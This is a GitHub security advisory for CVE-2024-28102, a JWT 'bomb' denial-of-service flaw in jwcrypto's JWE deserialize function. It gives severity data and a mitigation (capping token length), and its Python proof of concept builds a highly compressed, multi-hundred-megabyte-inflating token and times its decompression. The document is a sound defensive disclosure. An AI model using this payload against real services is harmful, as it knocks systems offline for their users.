# [M] JWCrypto vulnerable to JWT bomb Attack in `deserialize` function

## Summary
Severity: Medium
Advisory: GHSA-j857-7rvv-vj97
CVE: CVE-2024-28102
CWE: CWE-770
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:N/I:N/A:H (CVSS_V3)
Published: 2024-03-06
Source: https://github.com/advisories/GHSA-j857-7rvv-vj97
Type: github-advisory

## Affected
- PyPI: `jwcrypto` — affected >=0 <1.5.6

## Details
## Affected version
Vendor: https://github.com/latchset/jwcrypto
Version: 1.5.5

## Description
An attacker can cause a DoS attack by passing in a malicious JWE Token with a high compression ratio.
When the server processes this Token, it will consume a lot of memory and processing time.

## Poc
```python
from jwcrypto import jwk, jwe
from jwcrypto.common import json_encode, json_decode
import time
public_key = jwk.JWK()
private_key = jwk.JWK.generate(kty='RSA', size=2048)
public_key.import_key(**json_decode(private_key.export_public()))


payload = '{"u": "' + "u" * 400000000 + '", "uu":"' + "u" * 400000000 + '"}'
protected_header = {
    "alg": "RSA-OAEP-256",
    "enc": "A256CBC-HS512",
    "typ": "JWE",
    "zip": "DEF",
    "kid": public_key.thumbprint(),
}
jwetoken = jwe.JWE(payload.encode('utf-8'),
                   recipient=public_key,
                   protected=protected_header)
enc = jwetoken.serialize(compact=True)

print("-----uncompress-----")

print(len(enc))

begin = time.time()

jwetoken = jwe.JWE()
jwetoken.deserialize(enc, key=private_key)

print(time.time() - begin)

print("-----compress-----")

payload = '{"u": "' + "u" * 400000 + '", "uu":"' + "u" * 400000 + '"}'
protected_header = {
    "alg": "RSA-OAEP-256",
    "enc": "A256CBC-HS512",
    "typ": "JWE",
    "kid": public_key.thumbprint(),
}
jwetoken = jwe.JWE(payload.encode('utf-8'),
                   recipient=public_key,
                   protected=protected_header)
enc = jwetoken.serialize(compact=True)

print(len(enc))

begin = time.time()

jwetoken = jwe.JWE()
jwetoken.deserialize(enc, key=private_key)

print(time.time() - begin)
```
It can be found that when processing Tokens with similar lengths, the processing time of compressed tokens is significantly longer.
<img width="172" alt="image" src="https://github.com/latchset/jwcrypto/assets/133195620/23193327-3cd7-499a-b5aa-28c56af92785">



## Mitigation
To mitigate this vulnerability, it is recommended to limit the maximum token length to 250K. This approach has also
been adopted by the JWT library System.IdentityModel.Tokens.Jwt used in Microsoft Azure [1], effectively preventing
attackers from exploiting this vulnerability with high compression ratio tokens.

## References
[1] [CVE-2024-21319](https://github.com/AzureAD/azure-activedirectory-identitymodel-extensions-for-dotnet/security/advisories/GHSA-8g9c-28fc-mcx2)

## References
- https://github.com/latchset/jwcrypto/security/advisories/GHSA-j857-7rvv-vj97
- https://nvd.nist.gov/vuln/detail/CVE-2024-28102
- https://github.com/latchset/jwcrypto/commit/90477a3b6e73da69740e00b8161f53fea19b831f
- https://github.com/latchset/jwcrypto
- https://lists.debian.org/debian-lts-announce/2024/09/msg00026.html
- https://www.vicarius.io/vsociety/posts/denial-of-service-vulnerability-discovered-in-jwcrypto-cve-2024-28102-28103
